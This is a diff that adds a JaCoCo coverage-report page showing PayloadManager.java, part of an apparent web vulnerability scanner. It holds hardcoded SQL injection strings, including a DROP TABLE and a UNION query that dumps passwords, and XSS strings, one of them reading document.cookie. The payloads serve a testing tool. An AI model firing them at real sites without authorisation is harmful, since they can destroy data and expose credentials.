@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/><link rel="stylesheet" href="../jacoco-resources/report.css" type="text/css"/><link rel="shortcut icon" href="../jacoco-resources/report.gif" type="image/gif"/><title>PayloadManager.java</title><link rel="stylesheet" href="../jacoco-resources/prettify.css" type="text/css"/><script type="text/javascript" src="../jacoco-resources/prettify.js"></script></head><body onload="window['PR_TAB_WIDTH']=4;prettyPrint()"><div class="breadcrumb" id="breadcrumb"><span class="info"><a href="../jacoco-sessions.html" class="el_session">Sessions</a></span><a href="../index.html" class="el_report">web-vuln-scanner</a> &gt; <a href="index.source.html" class="el_package">com.example.scanner</a> &gt; <span class="el_source">PayloadManager.java</span></div><h1>PayloadManager.java</h1><pre class="source lang-java linenums">package com.example.scanner;
+
+import java.util.Arrays;
+import java.util.List;
+
+<span class="nc" id="L6">public class PayloadManager {</span>
+    /**
+     * Get SQL Injection payloads untuk testing.
+     * @return List of SQLi payloads.
+     */
+    public List&lt;String&gt; getSQLiPayloads() {
+<span class="nc" id="L12">        return Arrays.asList(</span>
+            &quot;' OR 1=1--&quot;,  // Classic tautology
+            &quot;'; DROP TABLE users--&quot;,  // Destructive (lab only!)
+            &quot;1' UNION SELECT username, password FROM users--&quot;,  // Union-based
+            &quot;' OR 'a'='a&quot;,  // Boolean-based
+            &quot;1; WAITFOR DELAY '0:0:5'--&quot;,  // Time-based (SQL Server)
+            &quot;1' AND 1=CONVERT(int, (SELECT @@version))--&quot;  // Error-based
+        );
+    }
+
+    /**
+     * Get XSS payloads untuk testing reflected/stored XSS.
+     * @return List of XSS payloads.
+     */
+    public List&lt;String&gt; getXSSPayloads() {
+<span class="nc" id="L27">        return Arrays.asList(</span>
+            &quot;&lt;script&gt;alert('XSS')&lt;/script&gt;&quot;,  // Basic alert
+            &quot;\&quot;'&gt;&lt;img src=x onerror=alert(1)&gt;&quot;,  // IMG tag breakout
+            &quot;&lt;svg onload=alert(1)&gt;&quot;,  // SVG onload
+            &quot;&lt;body onload=alert(1)&gt;&quot;,  // Body onload
+            &quot;javascript:alert(1)&quot;,  // JS protocol
+            &quot;'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;  // Cookie stealer (lab only)
+        );
+    }
+
+    /**
+     * Get payloads berdasarkan tipe vulnerability (dipanggil dari ScannerMain).
+     * @param vulnType &quot;SQLi&quot; atau &quot;XSS&quot;.
+     * @return List payloads yang sesuai, atau empty jika invalid.
+     */
+    public List&lt;String&gt; getPayloads(String vulnType) {
+<span class="nc bnc" id="L43" title="All 2 branches missed.">        if (&quot;SQLI&quot;.equalsIgnoreCase(vulnType)) {</span>
+<span class="nc" id="L44">            return getSQLiPayloads();</span>
+<span class="nc bnc" id="L45" title="All 2 branches missed.">        } else if (&quot;XSS&quot;.equalsIgnoreCase(vulnType)) {</span>
+<span class="nc" id="L46">            return getXSSPayloads();</span>
+        } else {
+<span class="nc" id="L48">            System.err.println(&quot;Unsupported vuln type: &quot; + vulnType + &quot;. Default to empty list.&quot;);</span>
+<span class="nc" id="L49">            return Arrays.asList();  // Empty list</span>
+        }
+    }
+
+    // Opsional: Method untuk load payloads dari file resources/payloads.txt
+    // public List&lt;String&gt; loadFromFile(String filePath) { ... } – tambah jika perlu
+}
+</pre><div class="footer"><span class="right">Created with <a href="http://www.jacoco.org/jacoco">JaCoCo</a> 0.8.8.202204050719</span></div></body></html>
